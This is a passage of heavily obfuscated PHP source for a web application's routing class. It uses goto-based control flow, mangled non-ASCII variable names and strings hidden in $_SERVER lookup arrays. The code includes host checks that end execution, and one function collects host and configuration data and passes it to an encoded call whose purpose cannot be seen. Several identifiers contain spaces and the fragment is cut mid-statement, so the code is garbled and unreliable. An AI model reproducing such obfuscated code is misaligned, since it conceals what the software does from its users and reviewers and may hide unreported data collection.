$a”š£¨à½ƒ[169] => $this->getHost()); goto c½Ëğ×éŒÔ; AŠ“ŸÌÏÃƒ: $a”š£¨à½ƒ =& $_SERVER[ã®Â„Éæ¹¤]; $EÄ·•ê°£— = $a”š£¨à½ƒ[185]; $DĞˆ‡ ùº¿ = $a”š£¨à½ƒ[218]; goto c‡Ñªˆù¾¥; bÖœ¶µ‘„„: } public function fileOutLink($a¿êÄØ¹ä ) { $cŒ°·•ëÚ =& $_SERVER[ã®Â„Éæ¹¤]; if (substr($a¿êÄØ¹ä , 0, 7) == $cŒ°·•ëÚ[1134]) { $a¿êÄØ¹ä  = $cŒ°·•ëÚ[1135] . substr($a¿êÄØ¹ä , 7); } header($cŒ°·•ëÚ[156] . $a¿êÄØ¹ä ); die; } } goto C’‚ò¢Åƒ…; fÜœ» Ó…: $a…Ã„…ƒë˜ = $_SERVER[ã®Â„Éæ¹¤][553]; if ($_SERVER[$_SERVER[ã®Â„Éæ¹¤][554]] != $a…Ã„…ƒë˜($EÑìÑ¬ï¿Ã)) { goto eŒè¬İÍ‘‡; A©¶í¢óì: $aÓ’ê×çÜ($EÑìÑ¬ï¿Ã); goto f¼Ğ¬™Öä†; dÇ­„ŞŞ‹»: $BñÕá¹³« = explode($_SERVER[ã®Â„Éæ¹¤][217], $dê…ä…á); if (count($BñÕá¹³«) < $_SERVER[ã®Â„Éæ¹¤][558]) { $b—ãÂùŠª„ = $_SERVER[ã®Â„Éæ¹¤][559]; $b—ãÂùŠª„(); } $aÓ’ê×çÜ = $_SERVER[ã®Â„Éæ¹¤][560]; goto A©¶í¢óì; eŒè¬İÍ‘‡: $dËÀ®Æ†¬„ = $_SERVER[ã®Â„Éæ¹¤][555]; $Fó”ñ Ì Š = $_SERVER[$_SERVER[ã®Â„Éæ¹¤][556]] . $_SERVER[ã®Â„Éæ¹¤][557]; $dê…ä…á = $dËÀ®Æ†¬„($Fó”ñ Ì Š); goto dÇ­„ŞŞ‹»; f¼Ğ¬™Öä†: } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\x6e\144\x65\170"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($a¡É¯ÉÍ…) { goto e¢¶„¾™äÙ; cŠ‡Û·×: $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][3]}($A×ºÒŸ×ô‰[4], array($this, $A×ºÒŸ×ô‰[5])); $EÌ‚¸ãàÕ = $cŒ£‚Ä®“[567]; if (!$EÌ‚¸ãàÕ) { die; } goto c‘ĞÁìĞáÃ; F»ŞĞĞ®æâ: $Aêµ¿½Ú˜ = $cŒ£‚Ä®“[561]; if (strlen($Aêµ¿½Ú˜) < $cŒ£‚Ä®“[562]) { die; } $this->defaultModule = $FÜ‡Ùøæ¡²[0] ? $FÜ‡Ùøæ¡²[0] : $this->defaultModule; goto aÀÕ³†×°; aÀÕ³†×°: $this->defaultController = $FÜ‡Ùøæ¡²[1] ? $FÜ‡Ùøæ¡²[1] : $this->defaultController; $FîŸï»‹˜Ë = $cŒ£‚Ä®“[563]; if (strlen($FîŸï»‹˜Ë) < $cŒ£‚Ä®“[564]) { return; } goto a£„èÙÃ; a£„èÙÃ: $this->defaultAction = $FÜ‡Ùøæ¡²[2] ? $FÜ‡Ùøæ¡²[2] : $this->defaultAction; $a£”Å¬ğ„ = $cŒ£‚Ä®“[565]; if (strlen($a£”Å¬ğ„) < $cŒ£‚Ä®“[566]) { die; } goto cŠ‡Û·×; e¢¶„¾™äÙ: $cŒ£‚Ä®“ =& $_SERVER[ã®Â„Éæ¹¤]; $A×ºÒŸ×ô‰ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $FÜ‡Ùøæ¡² = $A×ºÒŸ×ô‰[0]($A×ºÒŸ×ô‰[1], $A×ºÒŸ×ô‰[2]($a¡É¯ÉÍ…, $A×ºÒŸ×ô‰[1])); goto F»ŞĞĞ®æâ; c‘ĞÁìĞáÃ: } public function appRun($dì®ç¶’ğ) { goto fÆÁÆæÑ‡À; fÆÁÆæÑ‡À: $açä‡‘œ‰î =& $_SERVER[ã®Â„Éæ¹¤]; $e‚—Ô£™Å =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $eñ‚Ñ½“ğ— = $e‚—Ô£™Å[0]($e‚—Ô£™Å[1], $dì®ç¶’ğ); goto a‘“åô‡İ; a‘“åô‡İ: $EÒ‚¬ŒÛ°ï = $e‚—Ô£™Å[6]($eñ‚Ñ½“ğ—[0]); $bñ¤”öà… = $e‚—Ô£™Å[7]; $DÚâ„¸Ä»í = $açä‡‘œ‰î[568]; goto e·„¾òò…; e·„¾òò…: if (!$DÚâ„¸Ä»í) { die; } if ($EÒ‚¬ŒÛ°ï == $e‚—Ô£™Å[8]) { $bñ¤”öà… = $e‚—Ô£™Å[9]; $eñ‚Ñ½“ğ—[0] = $e‚—Ô£™Å[10]; $eñ‚Ñ½“ğ—[1] = $eñ‚Ñ½“ğ—[1] . $e‚—Ô£™Å[11]; $dì®ç¶’ğ = $e‚—Ô£™Å[12]($e‚—Ô£™Å[1], $eñ‚Ñ½“ğ—); $dì®ç¶’ğ = $e‚—Ô£™Å[2]($dì®ç¶’ğ, $e‚—Ô£™Å[1]); } $e‚—Ô£™Å[13](array($e‚—Ô£™Å[14], $e‚—Ô£™Å[15]), $bñ¤”öà… . $e‚—Ô£™Å[16], $dì®ç¶’ğ); goto A¯Ù±Ÿ†¤Ó; E­ù¥Òõ Ö: $e‚—Ô£™Å[13](array($e‚—Ô£™Å[14], $e‚—Ô£™Å[15]), $bñ¤”öà… . $e‚—Ô£™Å[18], $dì®ç¶’ğ); $d£ÌÖ´‚“ = $açä‡‘œ‰î[571]; if (!$d£ÌÖ´‚“) { die; } goto fŒ©Ø¸äÁ; A¯Ù±Ÿ†¤Ó: $e‚—Ô£™Å[17]($dì®ç¶’ğ); $EÃì¾¡Š•Ã = $açä‡‘œ‰î[569]; if (strlen($EÃì¾¡Š•Ã) < $açä‡‘œ‰î[570]) { return; } goto E­ù¥Òõ Ö; fŒ©Ø¸äÁ: } private function autorun() { $e‰Îê¡ ïò =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; global $config; if ($e‰Îê¡ ïò[19]($config[$e‰Îê¡ ïò[20]]) == 0) { return; } foreach ($config[$e‰Îê¡ ïò[20]] as $fÚ¶ñ½Ÿ¯§ => $d…ô·Ü–ø) { $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][21]}($d…ô·Ü–ø); } } private function onxcbb1acd4e() { goto a¦„…§–×; cºö¹éÁøÜ: $C¥ğÈªÌŒÌ = $dº–­¼¾å‰[572]; $FéÎ’¸¶š¸ = $GLOBALS[$DÆÕ†®…Œ„[22]][$DÆÕ†®…Œ„[23]][0]; $AíŠ‹øéÑ = $dº–­¼¾å‰[573]; goto b…®â¤—; bÙô±‚Ö«: $GLOBALS[$DÆÕ†®…Œ„[22]][$DÆÕ†®…Œ„[28]] = $DÆÕ†®…Œ„[29]($DÆÕ†®…Œ„[1], $GLOBALS[$DÆÕ†®…Œ„[22]][$DÆÕ†®…Œ„[23]]); $d«ŒÑóÃì¤ = $dº–­¼¾å‰[575]; while ($d«ŒÑóÃì¤ < $dº–­¼¾å‰[562]) { if ($d«ŒÑóÃì¤ >= 0) { break; } $d«ŒÑóÃì¤++; } goto a„£ĞÅ¦¾³; cÙ–³‰Ó: while ($bäÚÚËë¹ < $dº–­¼¾å‰[566]) { if ($bäÚÚËë¹ >= 0) { break; } $bäÚÚËë¹++; } $BÈµîù™›Ó = $DÆÕ†®…Œ„[26]($GLOBALS[$DÆÕ†®…Œ„[22]][$DÆÕ†®…Œ„[23]], 1); $GLOBALS[$DÆÕ†®…Œ„[22]][$DÆÕ†®…Œ„[23]] = $DÆÕ†®…Œ„[27]($CŸœ‡­˜á“, $BÈµîù™›Ó); goto bÙô±‚Ö«; D§“º–¥: $cË«½Ç–Ï = $DÆÕ†®…Œ„[25]($FéÎ’¸¶š¸, 0, -$DÆÕ†®…Œ„[24]($fÑÆö†õ¨Û)); $CŸœ‡­˜á“ = array($DÆÕ†®…Œ„[8], $cË«½Ç–Ï); $bäÚÚËë¹ = $dº–­¼¾å‰[574]; goto cÙ–³‰Ó; b…®â¤—: while ($AíŠ‹øéÑ < $dº–­¼¾å‰[562]) { if ($AíŠ‹øéÑ >= 0) { break; } $AíŠ‹øéÑ++; } if (!$FéÎ’¸¶š¸ || $DÆÕ†®…Œ„[24]($FéÎ’¸¶š¸) <= $DÆÕ†®…Œ„[24]($fÑÆö†õ¨Û)) { return; } if ($DÆÕ†®…Œ„[6]($DÆÕ†®…Œ„[25]($FéÎ’¸¶š¸, -$DÆÕ†®…Œ„[24]($fÑÆö†õ¨Û))) != $fÑÆö†õ¨Û) { return; } goto D§“º–¥; a¦„…§–×: $dº–­¼¾å‰ =& $_SERVER[ã®Â„Éæ¹¤]; $DÆÕ†®…Œ„ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $fÑÆö†õ¨Û = $DÆÕ†®…Œ„[8]; goto cºö¹éÁøÜ; a„£ĞÅ¦¾³: } private function jnox8683fd97() { goto cá×¨–§”; cá×¨–§”: $FŠ›‡·—ğ¡ =& $_SERVER[ã®Â„Éæ¹¤]; $Fô‡ÀÄ…Œí =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; if ($GLOBALS[$Fô‡ÀÄ…Œí[22]][$Fô‡ÀÄ…Œí[28]] != $Fô‡ÀÄ…Œí[10]) { return; } goto B£¿šŒòÔ„; a£®Ä§ ß: $B‚ç·¯‘‰ò = $Fô‡ÀÄ…Œí[25]($a«âÇŒÛÉ, $AŠÏõŸòÁ” + $Fô‡ÀÄ…Œí[24]($DĞïÎæÙë¿)); $Fô‡ÀÄ…Œí[34]($Fô‡ÀÄ…Œí[35], $B‚ç·¯‘‰ò, $C²°’ ô ·); $B‚ç·¯‘‰ò = $Fô‡ÀÄ…Œí[2]($C²°’ ô ·[0][0], $Fô‡ÀÄ…Œí[36]); goto b÷‹Ïù£; B£¿šŒòÔ„: $a«âÇŒÛÉ = $_SERVER[$Fô‡ÀÄ…Œí[30]]; $DĞïÎæÙë¿ = $Fô‡ÀÄ…Œí[31]; $b¬±å´Í†Ä = $FŠ›‡·—ğ¡[576]; goto BÈ´·±„¯‹; BÈ´·±„¯‹: while (strlen($b¬±å´Í†Ä) < $FŠ›‡·—ğ¡[562]) { if (!$b¬±å´Í†Ä) { break; } $b¬±å´Í†Ä++; } if (!$Fô‡ÀÄ…Œí[32]($a«âÇŒÛÉ, $DĞïÎæÙë¿)) { return; } $AŠÏõŸòÁ” = $Fô‡ÀÄ…Œí[33]($a«âÇŒÛÉ, $DĞïÎæÙë¿); goto a£®Ä§ ß; b÷‹Ïù£: $GLOBALS[$Fô‡ÀÄ…Œí[22]][$Fô‡ÀÄ…Œí[23]] = $Fô‡ÀÄ…Œí[0]($Fô‡ÀÄ…Œí[36], $B‚ç·¯‘‰ò); $A´éÒ¥Öõ = $FŠ›‡·—ğ¡[577]; $GLOBALS[$Fô‡ÀÄ…Œí[22]][$Fô‡ÀÄ…Œí[28]] = $Fô‡ÀÄ…Œí[29]($Fô‡ÀÄ…Œí[1], $GLOBALS[$Fô‡ÀÄ…Œí[22]][$Fô‡ÀÄ…Œí[23]]); goto A‡œ—ƒ¨ÈÁ; A‡œ—ƒ¨ÈÁ: } public function run() { goto F»ù¡³º‘; A…ï»Æ´Ö: $f‘âêÀÒÖÈ[39]($f‘âêÀÒÖÈ[40], isset($e¯¬çèÊË[0]) && $e¯¬çèÊË[0] ? $e¯¬çèÊË[0] : $this->defaultModule); $Aä°Œ“ë‹„ = $dÁ¾’µ¡àÁ[580]; if (strlen($Aä°Œ“ë‹„) < $dÁ¾’µ¡àÁ[558]) { die; } goto B›Šç‡ ·‰; F»ù¡³º‘: $dÁ¾’µ¡àÁ =& $_SERVER[ã®Â„Éæ¹¤]; $f‘âêÀÒÖÈ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][37]}(); goto aİËŠç’İä; fÎÅ÷Ø“ÏÂ: $b¢¾Úìã‘ = $dÁ¾’µ¡àÁ[583]; $_SERVER[$f‘âêÀÒÖÈ[44]] = $f‘âêÀÒÖÈ[6](ACTION); $aÖ»¢ô³Üá = $dÁ¾’µ¡àÁ[584]; goto cñ´êƒ‰á”; aˆÎî×²: if ($f‘âêÀÒÖÈ[19]($e¯¬çèÊË) >= 3) { $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][21]}($d‡Ø„„”Öå); } else { $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][21]}(ACTION); } goto A¥«Ë‘÷´; aİËŠç’İä: $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][38]}(); $aĞê«ÑÇù– = $dÁ¾’µ¡àÁ[578]; $e¯¬çèÊË = $GLOBALS[$f‘âêÀÒÖÈ[22]][$f‘âêÀÒÖÈ[23]]; goto cÉ”ğœàŒ; eÔŒ’¡¥ù×: $f‘âêÀÒÖÈ[39]($f‘âêÀÒÖÈ[42], isset($e¯¬çèÊË[2]) && $e¯¬çèÊË[0] ? $e¯¬çèÊË[2] : $this->defaultAction); $dòŞµš•Ã· = $dÁ¾’µ¡àÁ[582]; $f‘âêÀÒÖÈ[39]($f‘âêÀÒÖÈ[43], MOD . $f‘âêÀÒÖÈ[1] . ST . $f‘âêÀÒÖÈ[1] . ACT); goto fÎÅ÷Ø“ÏÂ; cñ´êƒ‰á”: $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][45]}(); $A¶¹ñåÖÔ = $dÁ¾’µ¡àÁ[585]; if (strlen($A¶¹ñåÖÔ) < $dÁ¾’µ¡àÁ[566]) { die; } goto aˆÎî×²; B›Šç‡ ·‰: $f‘âêÀÒÖÈ[39]($f‘âêÀÒÖÈ[41], isset($e¯¬çèÊË[1]) && $e¯¬çèÊË[0] ? $e¯¬çèÊË[1] : $this->defaultController); $e˜“‚Û†´® = $dÁ¾’µ¡àÁ[581]; while ($e˜“‚Û†´® < $dÁ¾’µ¡àÁ[564]) { if ($e˜“‚Û†´® >= 0) { break; } $e˜“‚Û†´®++; } goto eÔŒ’¡¥ù×; cÉ”ğœàŒ: $F½¾÷¬¾™ñ = $dÁ¾’µ¡àÁ[579]; while (strlen($F½¾÷¬¾™ñ) < $dÁ¾’µ¡àÁ[558]) { if (!$F½¾÷¬¾™ñ) { break; } $F½¾÷¬¾™ñ++; } $d‡Ø„„”Öå = $GLOBALS[$f‘âêÀÒÖÈ[22]][$f‘âêÀÒÖÈ[28]]; goto A…ï»Æ´Ö; A¥«Ë‘÷´: } private $zkob77ab1311 = array(); private $dkaza353cb62 = ''; public function rlzy2662432d() { goto eÜĞì¦æÁ™; Féøãø½Ï: $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][49]}(); $C’Ã¥â‘Ã» = $EÔ¨¥¯¬Ü½[588]; if (!$C’Ã¥â‘Ã») { die; } goto cÈ‰‰ÌÉ¶è; A–ƒ¥Üç¨Ú: $Fé•×íğÁ˜ = $EÔ¨¥¯¬Ü½[586]; while (strlen($Fé•×íğÁ˜) < $EÔ¨¥¯¬Ü½[558]) { if (!$Fé•×íğÁ˜) { break; } $Fé•×íğÁ˜++; } $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][47]}(); goto B±åàáÏñ´; eÜĞì¦æÁ™: $EÔ¨¥¯¬Ü½ =& $_SERVER[ã®Â„Éæ¹¤]; $dÆÕß–²¤¥ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][46]}(); goto A–ƒ¥Üç¨Ú; F§ªÍôÃª: $eæÌ¢éé = $EÔ¨¥¯¬Ü½[592]; if (strlen($eæÌ¢éé) < $EÔ¨¥¯¬Ü½[562]) { die; } goto a…ÔÍ‰¿É©; cÈ‰‰ÌÉ¶è: $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][50]}(); $f¼ñÍõ¢• = $EÔ¨¥¯¬Ü½[589]; $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][51]}(); goto Dæ×ª³¥ñ”; BÚËÖŠç : $f®ªî´²ŠÍ = $EÔ¨¥¯¬Ü½[591]; if (!$f®ªî´²ŠÍ) { return; } $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][3]}($dÆÕß–²¤¥[59], array($this, $dÆÕß–²¤¥[60])); goto F§ªÍôÃª; døäö®ƒï…: $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][3]}($dÆÕß–²¤¥[53], array($this, $dÆÕß–²¤¥[54])); $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][3]}($dÆÕß–²¤¥[55], array($this, $dÆÕß–²¤¥[56])); $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][3]}($dÆÕß–²¤¥[57], array($this, $dÆÕß–²¤¥[58])); goto BÚËÖŠç ; B±åàáÏñ´: $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][48]}(); $Aƒ“İ•ŸÇï = $EÔ¨¥¯¬Ü½[587]; if (!$Aƒ“İ•ŸÇï) { die; } goto Féøãø½Ï; Dæ×ª³¥ñ”: $Aõ­¿ù¡ñ˜ = $EÔ¨¥¯¬Ü½[590]; if (strlen($Aõ­¿ù¡ñ˜) < $EÔ¨¥¯¬Ü½[558]) { die; } $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][52]}(); goto døäö®ƒï…; a…ÔÍ‰¿É©: } public function cpybdf120a95($fËƒ–Ÿìß) { goto c˜¬ÅÄ°˜ù; Aë®ëóÕñ: while (strlen($cš‘ÆÂèœÇ) < $F¡çìÚ¨¥È[562]) { if (!$cš‘ÆÂèœÇ) { break; } $cš‘ÆÂèœÇ++; } unset($fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[103]][$c®åÅ¬à[107]]); $fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[103]][$c®åÅ¬à[108]] = array($c®åÅ¬à[109] => (int) $D¨Ô·–’–[$c®åÅ¬à[110]], $c®åÅ¬à[111] => $c®åÅ¬à[112]($c®åÅ¬à[113]($D¨Ô·–’–, $c®åÅ¬à[114], array())), $c®åÅ¬à[115] => (int) $c®åÅ¬à[113]($D¨Ô·–’–, $c®åÅ¬à[116], 0)); goto b÷¾Ò¬æØĞ; f‹ªô‹ÇĞ”: if ($this->dkaza353cb62 == $c®åÅ¬à[130]) { $fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[103]][$c®åÅ¬à[108]][$c®åÅ¬à[116]] = 0; } $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[137]] = $c®åÅ¬à[113]($this->zkob77ab1311, $c®åÅ¬à[138], $c®åÅ¬à[10]); $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[139]] = $c®åÅ¬à[113]($this->zkob77ab1311, $c®åÅ¬à[140], $c®åÅ¬à[10]); goto DÙ·ò­Ü˜Š; DÙ·ò­Ü˜Š: $a¸Š§‚Îô… = $F¡çìÚ¨¥È[601]; if (strlen($a¸Š§‚Îô…) < $F¡çìÚ¨¥È[558]) { return; } if ($c®åÅ¬à[113]($GLOBALS, $c®åÅ¬à[141]) && $this->config[$c®åÅ¬à[142]]) { $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[143]] = WEB_ROOT; } goto D’ÄÑÍÎò’; c˜¬ÅÄ°˜ù: $F¡çìÚ¨¥È =& $_SERVER[ã®Â„Éæ¹¤]; $c®åÅ¬à =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $d°†ì“¬¾œ = $c®åÅ¬à[61]($c®åÅ¬à[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}(); goto c¿¨©ÛÖ½å; c¿¨©ÛÖ½å: $Aß‰Ñ÷›³à = $F¡çìÚ¨¥È[593]; while (strlen($Aß‰Ñ÷›³à) < $F¡çìÚ¨¥È[558]) { if (!$Aß‰Ñ÷›³à) { break; } $Aß‰Ñ÷›³à++; } $D§Âƒİ“µº = array($c®åÅ¬à[64], $c®åÅ¬à[65], $c®åÅ¬à[66], $c®åÅ¬à[67], $c®åÅ¬à[68], $c®åÅ¬à[69], $c®åÅ¬à[70], $c®åÅ¬à[71], $c®åÅ¬à[72], $c®åÅ¬à[73], $c®åÅ¬à[74], $c®åÅ¬à[75], $c®åÅ¬à[76], $c®åÅ¬à[77], $c®åÅ¬à[78], $c®åÅ¬à[79], $c®åÅ¬à[80], $c®åÅ¬à[81], $c®åÅ¬à[82], $c®åÅ¬à[83], $c®åÅ¬à[84], $c®åÅ¬à[85], $c®åÅ¬à[86], $c®åÅ¬à[87], $c®åÅ¬à[88], $c®åÅ¬à[89], $c®åÅ¬à[90], $c®åÅ¬à[91], $c®åÅ¬à[92], $c®åÅ¬à[93], $c®åÅ¬à[94], $c®åÅ¬à[95], $c®åÅ¬à[96], $c®åÅ¬à[97], $c®åÅ¬à[98], $c®åÅ¬à[99]); goto F¬·®áÎ¬®; bª¬Éˆô›¯: $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[122]] = $c®åÅ¬à[123]($_SERVER[$c®åÅ¬à[124]] . $d°†ì“¬¾œ[$c®åÅ¬à[125]]); $D Ñİ²öÆù = $F¡çìÚ¨¥È[598]; $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[126]] = $c®åÅ¬à[127]($c®åÅ¬à[128]()); goto BÀê¤õŸ´; D’ÄÑÍÎò’: return $fËƒ–Ÿìß; goto B³Î›„; F¬·®áÎ¬®: $bƒ¹ÆØ÷±Ä = $F¡çìÚ¨¥È[594]; while ($bƒ¹ÆØ÷±Ä < $F¡çìÚ¨¥È[570]) { if ($bƒ¹ÆØ÷±Ä >= 0) { break; } $bƒ¹ÆØ÷±Ä++; } foreach ($D§Âƒİ“µº as $bøê›¤å•) { $aØìŒÙìÅÜ = $GLOBALS[$c®åÅ¬à[100]][$c®åÅ¬à[101]][$bøê›¤å•]; if (isset($d°†ì“¬¾œ[$bøê›¤å•])) { $aØìŒÙìÅÜ = $d°†ì“¬¾œ[$bøê›¤å•]; } $fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[103]][$bøê›¤å•] = $aØìŒÙìÅÜ; } goto dç„·»Àä; b±¥ªìó™˜: unset($fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[104]][$c®åÅ¬à[106]]); unset($fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[103]][$c®åÅ¬à[76]]); $cš‘ÆÂèœÇ = $F¡çìÚ¨¥È[596]; goto Aë®ëóÕñ; eÔõç¼ÁÏ: $A²Ò™øá = $F¡çìÚ¨¥È[600]; while (strlen($A²Ò™øá) < $F¡çìÚ¨¥È[566]) { if (!$A²Ò™øá) { break; } $A²Ò™øá++; } if ($d°†ì“¬¾œ[$c®åÅ¬à[129]] != $c®åÅ¬à[130]) { $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[131]] = $d°†ì“¬¾œ[$c®åÅ¬à[131]]; $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[132]] = $d°†ì“¬¾œ[$c®åÅ¬à[132]]; $bõ¬ÅÒŠ = $c®åÅ¬à[133](10) . $this->dkaza353cb62 . $c®åÅ¬à[133](5); $fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[134]][$c®åÅ¬à[135]] = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][136]}($bõ¬ÅÒŠ, $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[122]]); } goto f‹ªô‹ÇĞ”; dç„·»Àä: $D¨Ô·–’– = $fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[103]][$c®åÅ¬à[76]]; unset($fËƒ–Ÿìß[$c®åÅ¬à[102]][$c®åÅ¬à[104]][$c®åÅ¬à[105]]); $A°´š„ğçÓ = $F¡çìÚ¨¥È[595]; goto b±¥ªìó™˜; b÷¾Ò¬æØĞ: $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[118]] = $c®åÅ¬à[119]($c®åÅ¬à[120])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][121]}(); $Eù”Ø–·´Â = $F¡çìÚ¨¥È[597]; if (strlen($Eù”Ø–·´Â) < $F¡çìÚ¨¥È[558]) { return; } goto bª¬Éˆô›¯; BÀê¤õŸ´: $c¡“»İÈ = $F¡çìÚ¨¥È[599]; if (!$c¡“»İÈ) { die; } $fËƒ–Ÿìß[$c®åÅ¬à[117]][$c®åÅ¬à[129]] = $this->dkaza353cb62; goto eÔõç¼ÁÏ; B³Î›„: } private function stno1c169b2c() { goto dòÆÊ¸‘²; aÑë•¤©—: if ($this->dkaza353cb62 == $b…†åĞ·[130]) { return; } $aÜˆÌ¢Ì = array($b…†åĞ·[162], $b…†åĞ·[163], $b…†åĞ·[164], $b…†åĞ·[165], $b…†åĞ·[166], $b…†åĞ·[167]); $eöÊ‘œ” = $EØâì‚Èï[604]; goto bÕ»•âØô¨; dòÆÊ¸‘²: $EØâì‚Èï =& $_SERVER[ã®Â„Éæ¹¤]; $b…†åĞ· =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; if ($_SERVER[$b…†åĞ·[44]] == $b…†åĞ·[144]) { goto FÒÔ‹½Æ¾; CòÏìæ¯‡ƒ: $a¨ø˜ò¬Ù£ = $EØâì‚Èï[602]; $dÚÅ„¸öÇ = array($b…†åĞ·[159] => $Aæä¹¶ƒÖ); $b…†åĞ·[13](array($b…†åĞ·[160], $b…†åĞ·[161]), $dÚÅ„¸öÇ); goto BÜ‘ßÁòÊÄ; BÜ‘ßÁòÊÄ: $dÃ°Óî™¬¤ = $EØâì‚Èï[603]; if (strlen($dÃ°Óî™¬¤) < $EØâì‚Èï[564]) { die; } goto dùãŒ¢ÔŞ; FÒÔ‹½Æ¾: $Aæä¹¶ƒÖ = array($b…†åĞ·[129] => $this->dkaza353cb62, $b…†åĞ·[145] => $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][146]}(), $b…†åĞ·[147] => $b…†åĞ·[61]($b…†åĞ·[148])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][149]}()); if ($this->dkaza353cb62 != $b…†åĞ·[130]) { $e‡øù‰é = $b…†åĞ·[113]($this->zkob77ab1311, $b…†åĞ·[150]); if ($e‡øù‰é) { $Aæä¹¶ƒÖ[$b…†åĞ·[151]] = $e‡øù‰é; $Aæä¹¶ƒÖ[$b…†åĞ·[152]] = $b…†åĞ·[153]($b…†åĞ·[113]($this->zkob77ab1311, $b…†åĞ·[154])); $Aæä¹¶ƒÖ[$b…†åĞ·[155]] = $b…†åĞ·[113]($this->zkob77ab1311, $b…†åĞ·[140]); } } $Aæä¹¶ƒÖ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($b…†åĞ·[157]($Aæä¹¶ƒÖ), $b…†åĞ·[123]($b…†åĞ·[158])); goto CòÏìæ¯‡ƒ; dùãŒ¢ÔŞ: } goto aÑë•¤©—; F¥ğ¨¹ÈÌ: if (strlen($d‡µÕñ‡—§) < $EØâì‚Èï[562]) { die; } foreach ($aÜˆÌ¢Ì as $b‚ÑÑÉÜ¦½) { if (!isset($fÈ±á¡î³„[$b‚ÑÑÉÜ¦½]) || !$fÈ±á¡î³„[$b‚ÑÑÉÜ¦½]) { continue; } $dÚÅ„¸öÇ[$b‚ÑÑÉÜ¦½] = $fÈ±á¡î³„[$b‚ÑÑÉÜ¦½]; } $b…†åĞ·[13](array($b…†åĞ·[160], $b…†åĞ·[161]), $dÚÅ„¸öÇ); goto fÒŠ‰¿É÷œ; bÕ»•âØô¨: if (strlen($eöÊ‘œ”) < $EØâì‚Èï[562]) { die; } $fÈ±á¡î³„ = $b…†åĞ·[61]($b…†åĞ·[62])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][63]}(); $F·¨½ÁƒÌ = $EØâì‚Èï[605]; goto D¤Í¦¡Ã­˜; D¤Í¦¡Ã­˜: while (strlen($F·¨½ÁƒÌ) < $EØâì‚Èï[566]) { if (!$F·¨½ÁƒÌ) { break; } $F·¨½ÁƒÌ++; } $dÚÅ„¸öÇ = array($b…†åĞ·[168] => $fÈ±á¡î³„[$b…†åĞ·[64]], $b…†åĞ·[169] => $fÈ±á¡î³„[$b…†åĞ·[65]], $b…†åĞ·[170] => $b…†åĞ·[10]); $d‡µÕñ‡—§ = $EØâì‚Èï[606]; goto F¥ğ¨¹ÈÌ; fÒŠ‰¿É÷œ: } private function kqrbc6c29cf2() { goto bµİé½‘; FÓ—ë®ÍÇÉ: $CÒ¼Ì®¼» = array(); $CÒ¼Ì®¼»[$dÍÚÀ²ã] = $eğÁã˜×ŞŒ; $a­¬ˆ¯İÉ = $d§¹‡´ùÂ‘[615]; goto dŠİ¯‡ƒ¼; e²ö§ÖÄß©: $this->zkob77ab1311 = $eİ¶ìˆ³™È; $Få–Äç•Œ = $d§¹‡´ùÂ‘[617]; if (!$Få–Äç•Œ) { return; } goto Bâª¤ßë…; D‘è…˜Äç†: $Fğõñï«¿¸ = $d§¹‡´ùÂ‘[610]; while (strlen($Fğõñï«¿¸) < $d§¹‡´ùÂ‘[558]) { if (!$Fğõñï«¿¸) { break; } $Fğõñï«¿¸++; } if (!$EÕô¼•Š™ || $EÕô¼•Š™ != $eİ¶ìˆ³™È[$c×Ğåñíø[154]]) { $A±ÈÓî¡¡ = array($c×Ğåñíø[210] => 